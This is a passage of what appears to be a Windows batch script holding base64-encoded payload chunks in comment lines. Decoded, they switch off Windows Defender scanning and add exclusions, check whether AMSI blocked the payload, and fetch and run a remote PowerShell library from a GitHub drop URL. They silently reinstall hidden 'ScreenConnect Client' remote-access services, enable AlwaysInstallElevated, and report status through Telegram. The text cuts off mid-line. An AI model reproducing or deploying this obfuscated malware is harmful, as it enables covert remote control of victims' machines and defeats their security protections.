::RlA9JSVMIg0KDQpyZW0gc29mdCByZWcgZXhjbHVzaW9ucyBldmVyeSBtdXN0LWhl
::YWwgKHdvcmtzIGV2ZW4gd2hlbiBXaW5EZWZlbmQgc2VydmljZSBkZWFkKQ0KcmVn
::IGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBE
::ZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNj
::YW5uaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAi
::SEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNp
::b25zXFBhdGhzIiAvdiAiJVdEJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAy
::PiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlU3lzdGVtUm9vdCVcVGVtcFwu
::dXBkIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCg0KcmVtIHJlLWZl
::dGNoIGxpYiBpbnRvIFRFTVAgaWYgV0QgY29weSBtaXNzaW5nIChBTVNJL3F1YXJh
::bnRpbmUgd2lwZSkNCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0K
::ICBlY2hvIGdyeXhhX211c3RfbGliX21pc3NpbmdfcmVmZXRjaD4+IiVMT0clIg0K
::ICAiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQg
::MTAgLS1tYXgtdGltZSA0MCAtbyAiJVN5c3RlbVJvb3QlXFRlbXBcLnVwZFxvd25f
::bGliLnBzMSIgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9i
::dWRkeS9naXRodWItZHJvcC9tYWluL293bl9saWIucHMxIiA+bnVsIDI+JjENCiAg
::aWYgZXhpc3QgIiVTeXN0ZW1Sb290JVxUZW1wXC51cGRcb3duX2xpYi5wczEiIGNv
::cHkgL3kgIiVTeXN0ZW1Sb290JVxUZW1wXC51cGRcb3duX2xpYi5wczEiICIlV0Ql
::XG93bl9saWIucHMxIiA+bnVsIDI+JjENCikNCg0Kc2V0ICJMSUI9JVdEJVxvd25f
::bGliLnBzMSINCmlmIG5vdCBleGlzdCAiJUxJQiUiIGlmIGV4aXN0ICIlU3lzdGVt
::Um9vdCVcVGVtcFwudXBkXG93bl9saWIucHMxIiBzZXQgIkxJQj0lU3lzdGVtUm9v
::dCVcVGVtcFwudXBkXG93bl9saWIucHMxIg0KDQppZiBleGlzdCAiJUxJQiUiICgN
::CiAgc2V0ICJHUkVTPSINCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIg
::aW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
::dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlTElCJSIgLUFjdGlvbiBncnl4YS1l
::bnN1cmUgLU5vV2FpdCAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIDJe
::Pm51bGApIGRvIHNldCAiR1JFUz0lJVIiDQogIGVjaG8gZ3J5eGFfbXVzdF9saWI9
::IUdSRVMhPj4iJUxPRyUiDQogIGVjaG8gIUdSRVMhfCBmaW5kc3RyIC9JICJtYWxp
::Y2lvdXMgU2NyaXB0Q29udGFpbmVkTWFsaWNpb3VzQ29udGVudCIgPm51bA0KICBp
::ZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIGdyeXhhX211c3RfYW1zaV9i
::bG9ja2VkPj4iJUxPRyUiDQogICAgc2V0ICJHUkVTPSINCiAgKQ0KICBlY2hvICFH
::UkVTIXwgZmluZHN0ciAvSSAvQiAvQzoiSEVBTFRIWSIgL0M6IlFVRVVFRCIgL0M6
::IklORkxJR0hUIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgdGltZW91dCAv
::dCAxNSAvbm9icmVhayA+bnVsDQopDQoNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0
::IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYg
::bm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQoNCmlmICIlR1JZWEFf
::T0slIj09IjAiICgNCiAgZWNobyBncnl4YV9tdXN0X2NtZF9mYWxsYmFjaz4+IiVM
::T0clIg0KICBpZiBub3QgZXhpc3QgIiVXRCVcb3duX2dyeXhhLmNtZCIgKA0KICAg
::ICIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAx
::MCAtLW1heC10aW1lIDIwIC1vICIlV0QlXG93bl9ncnl4YS5jbWQiICIlT1dOR1JZ
::WEElIiA+bnVsIDI+JjENCiAgICBpZiBub3QgZXhpc3QgIiVXRCVcb3duX2dyeXhh
::LmNtZCIgIiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgMTAgLS1tYXgtdGlt
::ZSAyMCAtbyAiJVdEJVxvd25fZ3J5eGEuY21kIiAiJU9XTkdSWVhBMiUiID5udWwg
::Mj4mMQ0KICApDQogIGlmIGV4aXN0ICIlV0QlXG93bl9ncnl4YS5jbWQiICgNCiAg
::ICByZW0gZGV0YWNoZWQgc28gbW9uIHRpY2sgaXMgbm90IGJsb2NrZWQgYnkgbXNp
::ZXhlYw0KICAgIHN0YXJ0ICIiIC9iIGNtZCAvYyAiY2FsbCBcIiVXRCVcb3duX2dy
::eXhhLmNtZFwiIFwiJVdEJVwiIFwiJUdSWVhBX0ZQJVwiIFwiJUtFRVBfRlAlXCIg
::XCIlQUxUX0ZQJVwiID4+XCIlTE9HJVwiIDI+JjEiDQogICAgZWNobyBncnl4YV9t
::dXN0X2NtZF9zcGF3bmVkPj4iJUxPRyUiDQogICAgdGltZW91dCAvdCAyNSAvbm9i
::cmVhayA+bnVsDQogICkgZWxzZSAoDQogICAgZWNobyBncnl4YV9tdXN0X2NtZF9t
::aXNzaW5nPj4iJUxPRyUiDQogICkNCikNCg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQpp
::ZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCmlmICIlR1JZWEFf
::T0slIj09IjEiIChlY2hvIGdyeXhhX211c3RfcnVubmluZ19vaz4+IiVMT0clIikg
::ZWxzZSAoZWNobyBncnl4YV9tdXN0X3N0aWxsX2Rvd24+PiIlTE9HJSIpDQpleGl0
::IC9iIDANCg0KOlRnR3J5eGENCnJlbSAlMT1raW5kICUyPW1zZyDigJQgcGVyLUdy
::eXhhIHN0YXRlIHNvIGl0IGNhbm5vdCByZXVzZSBQcmltYXJ5IG93bl9tb24uc3Rh
::dGUuDQpzZXQgIkdTVEFURT0lfjEiDQpzZXQgIkdNU0c9JX4yIg0Kc2V0ICJHU1RB
::VEVGSUxFPSVXRCVcb3duX21vbl9ncnl4YS5zdGF0ZSINCnNldCAiR09MRD0iDQpp
::ZiBleGlzdCAiJUdTVEFURUZJTEUlIiBzZXQgL3AgR09MRD08IiVHU1RBVEVGSUxF
::JSINCmlmIC9JICIlR1NUQVRFJSI9PSJSRVNUT1JFRCIgKA0KICBpZiAvSSAiJUdP
::TEQlIj09IlJFU1RPUkVEIiBleGl0IC9iIDANCiAgaWYgZXhpc3QgIiVXRCVcdGdf
::Z3J5eGEuZmxhZyIgKA0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQt
::SXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcdGdfZ3J5eGEuZmxhZycpLkxhc3RXcml0
::ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMTQ0MCl7ZXhpdCAwfWVsc2V7ZXhpdCAx
::fSIgPm51bCAyPiYxDQogICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICBl
::Y2hvIHRnX2dyeXhhX3N1cHByZXNzXyVHU1RBVEUlPj4iJUxPRyUiDQogICAgICBl
::eGl0IC9iIDANCiAgICApDQogICkNCiAgZWNobyAlR1NUQVRFJT4iJUdTVEFURUZJ
::TEUlIg0KICBlY2hvIHNlbnQ+IiVXRCVcdGdfZ3J5eGEuZmxhZyINCiAgcG93ZXJz
::aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
::IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgJUdTVEFU
::RSUgLVN1bW1hcnkgIiVHTVNHJSIgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09V
::TlQlID5udWwgMj4mMQ0KICBlY2hvIHRnIGdyeXhhICVHU1RBVEUlIHNlbnQ+PiIl
::TE9HJSINCiAgZXhpdCAvYiAwDQopDQppZiAvSSAiJUdTVEFURSUiPT0iRE9XTiIg
::aWYgL0kgIiVHT0xEJSI9PSJET1dOIiBpZiBleGlzdCAiJVdEJVx0Z19ncnl4YS5m
::bGFnIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0
::ZXJhbFBhdGggJyVXRCVcdGdfZ3J5eGEuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRv
::dGFsTWludXRlcyAtbHQgMzYwKXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+
::JjENCiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyB0Z19ncnl4YV9z
::dXBwcmVzc18lR1NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQop
::DQplY2hvICVHU1RBVEUlPiIlR1NUQVRFRklMRSUiDQplY2hvIHNlbnQ+IiVXRCVc
::dGdfZ3J5eGEuZmxhZyINCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
::Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVw
::b3J0LnBzMSIgLVN0YXRlICVHU1RBVEUlIC1TdW1tYXJ5ICIlR01TRyUiIC1CdWls
::ZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gdGcgZ3J5
::eGEgJUdTVEFURSUgc2VudD4+IiVMT0clIg0KZXhpdCAvYiAwDQoNCjpJbnN0YWxs
::TXNpDQpyZW0gJTE9dXJsICUyPXRhZw0Kc2V0ICJVUkw9JX4xIg0Kc2V0ICJUQUc9
::JX4yIg0KZWNobyBbJVRBRyVdIGZldGNoICVVUkwlPj4iJUxPRyUiDQoiJUNVUkwl
::IiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgt
::dGltZSAzMDAgLW8gIiVNU0klLnRtcCIgIiVVUkwlIiA+PiIlTE9HJSIgMj4mMQ0K
::Zm9yICUlRiBpbiAoIiVNU0klLnRtcCIpIGRvIGlmICUlfnpGIExFUSAxMDAwMDAw
::ICgNCiAgZWNobyBbJVRBRyVdIGZldGNoIGZhaWxlZD4+IiVMT0clIg0KICBkZWwg
::L2YgL3EgIiVNU0klLnRtcCIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KbW92
::ZSAveSAiJU1TSSUudG1wIiAiJU1TSSUiID5udWwgMj4mMQ0KcmVtIE00MTogT0xF
::IG1hZ2ljICsgUHJvZHVjdE5hbWUgRlAgbXVzdCBtYXRjaCBLRUVQX0ZQIGJlZm9y
::ZSAvaQ0Kc2V0ICJNU0lPSz1ubyINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMx
::IiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwg
::LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
::c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gdGVzdC1tc2kgLUZw
::ICIlS0VFUF9GUCUiIC1FeHRyYSAiJU1TSSUiIC1Xb3JrRGlyICIlV0QlImApIGRv
::IHNldCAiTVNJT0s9JSVSIg0KaWYgL0kgbm90ICIhTVNJT0shIj09InllcyIgKA0K
::ICBlY2hvIFslVEFHJV0gbXNpX3ZhbGlkYXRlX2ZhaWw+PiIlTE9HJSINCiAgZGVs
::IC9mIC9xICIlTVNJJSIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KcmVtIE00
::Mjogc2libGluZy1zYWZlIGNvcHkgKGVtcHR5IFVwZ3JhZGUgdGFibGUpIGJlZm9y
::ZSBzZXZyeiAvaQ0Kc2V0ICJNU0lfU0FGRT0lTVNJJSINCmlmIGV4aXN0ICIlV0Ql
::XG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUyBpbiAo
::YHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlv
::blBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
::cHJvdGVjdC1tc2kgLUV4dHJhICIlTVNJJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8g
::aWYgbm90ICIlJVMiPT0iRkFJTCIgaWYgZXhpc3QgIiUlUyIgc2V0ICJNU0lfU0FG
::RT0lJVMiDQpjYWxsIDpOb01zaVBvbGljeQ0KcmVtIE0xMy9NNDE6IHN0YWxlIHBy
::aW1hcnkgZGlyIHVuZGVyIFBGIGFuZCBQRjg2DQpzYyBxdWVyeSAiU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZl
::bCAxICgNCiAgaWYgZXhpc3QgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAo
::JUtFRVBfRlAlKSIgKA0KICAgIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW5f
::cGY4Nj4+IiVMT0clIg0KICAgIHJtZGlyIC9zIC9xICIlUEY4NiVcU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICApDQogIGlmIGV4
::aXN0ICIlUHJvZ3JhbUZpbGVzJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBf
::RlAlKSIgKA0KICAgIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW5fcGY+PiIl
::TE9HJSINCiAgICBybWRpciAvcyAvcSAiJVByb2dyYW1GaWxlcyVcU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICApDQopDQplY2hv
::IFslVEFHJV0gbXNpZXhlYyBpbnN0YWxsPj4iJUxPRyUiDQptc2lleGVjIC9pICIl
::TVNJX1NBRkUlIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFs
::bHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxDQpz
::ZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KZWNobyBbJVRBRyVdIG1zaWV4ZWMg
::ZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCmlmICIhTVNJRVhJVCEiPT0iMTYxOCIg
::KA0KICBlY2hvIFslVEFHJV0gbXNpX2J1c3lfcmV0cnk+PiIlTE9HJSINCiAgdGlt
::ZW91dCAvdCAzMCAvbm9icmVhayA+bnVsDQogIG1zaWV4ZWMgL2kgIiVNU0lfU0FG
::RSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHBy
::ZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwyLmxvZyIgPm51bCAyPiYxDQogIHNldCAi
::TVNJRVhJVD0hRVJST1JMRVZFTCEiDQogIGVjaG8gWyVUQUclXSBtc2lleGVjX3Jl
::dHJ5IGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQopDQppZiAvSSBub3QgIiVNU0lf
::U0FGRSUiPT0iJU1TSSUiIGRlbCAvZiAvcSAiJU1TSV9TQUZFJSIgPm51bCAyPiYx
::DQpjYWxsIDpXYWl0U3ZjDQpjYWxsIDpSZXN0b3JlQWx0DQpyZW0gTzM3OiBzZXZy
::eiAvaSBzaGFyZXMgbGVnYWN5IFVwZ3JhZGVDb2RlcyB3aXRoIGdyeXhhIOKAlCBh
::bHdheXMgcmUtZW5zdXJlIEdyeXhhIGFmdGVyDQpjYWxsIDpFbnN1cmVHcnl4YU11
::c3QNCmV4aXQgL2IgMA0KDQo6UmVwYWlyUmVnaXN0ZXJlZA0KcmVtICUxPWZpbmdl
::cnByaW50IC0gc2VydmljZSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQ6
::IHJlcGFpciBieSBHVUlELg0KcmVtIE00MDogbGFiZWwgd2FzIGFtcHV0YXRlZCAo
::Ym9keSBzYXQgYWZ0ZXIgSW5zdGFsbE1zaSBleGl0IC9iKSBzbyBwcmltYXJ5IGhl
::YWwgbmV2ZXIgcmFuLg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::fjEpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwDQpp
::ZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGV4aXQgL2IgMQ0KcG93ZXJz
::aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
::IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIg
::LUZwICIlfjEiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KY2FsbCA6
::V2FpdFN2Yw0KZXhpdCAvYiAwDQoNCjpSZXN0b3JlQWx0DQpyZW0gQUxUIHNlcnZp
::Y2UgZ29uZSBidXQgc3RpbGwgcmVnaXN0ZXJlZCAoU0MtZmFtaWx5IG1zaWV4ZWMg
::c2lkZSBlZmZlY3QpIC0gcmVwYWlyIGl0IHRvby4NCnNjIHF1ZXJ5ICJTY3JlZW5D
::b25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJv
::cmxldmVsIDEgZXhpdCAvYiAwDQplY2hvIGFsdCBtaXNzaW5nIC0gcmVwYWlyIGF0
::dGVtcHQ+PiIlTE9HJSINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dl
::cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
::Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFp
::ciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEN
::CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZp
::bmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRf
::T0s9MSINCmV4aXQgL2IgMA0KDQo6Tm9Nc2lQb2xpY3kNCnJlZyBkZWxldGUgIkhL
::TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVy
::IiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGRlbGV0ZSAiSEtDVVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92
::IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmV4aXQgL2IgMA0K
::DQo6V2FpdFN2Yw0Kc2V0ICJUUklFUz0wIg0KOldhaXRMb29wDQpzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklO
::RyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVE
::PTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBleGl0IC9iIDANCikNCnNldCAvYSBU
::UklFUys9MQ0KaWYgJVRSSUVTJSBHRVEgMTAgZXhpdCAvYiAxDQpwaW5nIDEyNy4w
::LjAuMSAtbiA3ID5udWwgMj4mMQ0KZ290byA6V2FpdExvb3ANCg0KOlRnU3RhdGUN
::CnNldCAiTkVXU1RBVEU9JX4xIg0Kc2V0ICJNU0c9JX4yIg0Kc2V0ICJPTERTVEFU
::RT0iDQppZiBleGlzdCAiJVNUQVRFJSIgc2V0IC9wIE9MRFNUQVRFPTwiJVNUQVRF
::JSINCnJlbSBmYWxzZSBET1dOIGFmdGVyIHJlYm9vdCByYWNlOiBwcmltYXJ5IGFs
::cmVhZHkgUnVubmluZyDigJQgZG8gbm90IHNwYW0NCmlmIC9JICIlTkVXU1RBVEUl
::Ij09IkRPV04iICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::S0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9y
::bGV2ZWwgMSAoDQogICAgZWNobyB0Z19za2lwX2Rvd25fYWxyZWFkeV9ydW5uaW5n
::Pj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCikNCnJlbSByYXRlLWxpbWl0
::IHJlcGVhdGVkIERPV04vRkFJTDogbWF4IDEgYWxlcnQgcGVyIDZoIHdoaWxlIHN0
::dWNrDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJET1dOIiBnb3RvIDpNYXliZVN1cHBy
::ZXNzDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpNYXliZVN1cHBy
::ZXNzDQpnb3RvIDpTZW5kQWxlcnQNCjpNYXliZVN1cHByZXNzDQppZiAvSSAiJU5F
::V1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBpZiBleGlzdCAiJVdEJVx0Z19zZW50LmZs
::YWciICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::Q29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRl
::cmFsUGF0aCAnJVdEJVx0Z19zZW50LmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3Rh
::bE1pbnV0ZXMgLWx0IDM2MCl7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAyPiYx
::DQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGdfc3VwcHJlc3Nl
::ZF8lTkVXU1RBVEUlPj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCikNCjpT
::ZW5kQWxlcnQNCmVjaG8gJU5FV1NUQVRFJT4iJVNUQVRFJSINCmVjaG8gc2VudD4i
::JVdEJVx0Z19zZW50LmZsYWciDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
::dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRn
::X3JlcG9ydC5wczEiIC1TdGF0ZSAlTkVXU1RBVEUlIC1TdW1tYXJ5ICIlTVNHJSIg
::LUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwgMj4mMQ0KZWNobyB0
::ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+PiIlTE9HJSINCmV4aXQgL2IgMA0K
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwNFMxMyAtIHNl
::dnJ6LmNmZyArIGdyeXhhLmNmZyBkeW5hbWljIEZQczsgU1kgREVMRVRFK1dSSVRF
::X0RBQw0Kc2V0bG9jYWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhw
::YW5zaW9uDQpzZXQgIldEPSVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3Nc
::V0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQgIldEMj0lUHJvZ3JhbURhdGElXE1pY3Jv
::c29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxi
::b290LmVyciINCnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VF
::UDI9Zjg2MWM4MTQwZDQ1MzQyNyINCnNldCAiS0VFUDM9MzZlNTA2ZmYwMTZiMjE1
::MSINCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0
::b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6LmNmZyIpIGRv
::ICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktFRVAxPSUlTCIN
::CiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiS0VFUDI9JSVMIg0KKQ0KaWYg
::ZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kg
::IiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIktFRVAzPSUlTCINCnNldCAiUFJJTT1T
::Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQpzZXQgIkFMVD1TY3JlZW5D
::b25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQpzZXQgIkdSWVhBPVNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dyYW1GaWxlcyUiDQpz
::ZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9JVN5
::c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
::IG1rZGlyICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1r
::ZGlyICIlV0QyJSIgPm51bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUg
::JVRJTUUlIFMxMz4+IiVMT0clIg0KDQpSRU0gLS0tIE5ldXRyYWxpemUgTVNJIGJs
::b2NrIHBvbGljaWVzICgxNjI1KSAtLS0NClJFTSBEaXNhYmxlTVNJOiAwPWFsbG93
::LCAxPW5vbi1hZG1pbiBvbmx5LCAyPWFsbCAtPiBmb3JjZSAwDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
::ciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
::d3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxsRWxldmF0ZWQgL3QgUkVHX0RX
::T1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgZGVsZXRlICJIS0NVXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLQ1VcU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxs
::RWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQoNClJFTSAt
::LS0gRGVmZW5kZXI6IHJlZ2lzdHJ5IGV4Y2x1c2lvbnMgKHBvbGljeSArIHByZWZl
::cmVuY2Uga2V5cykgLS0tDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
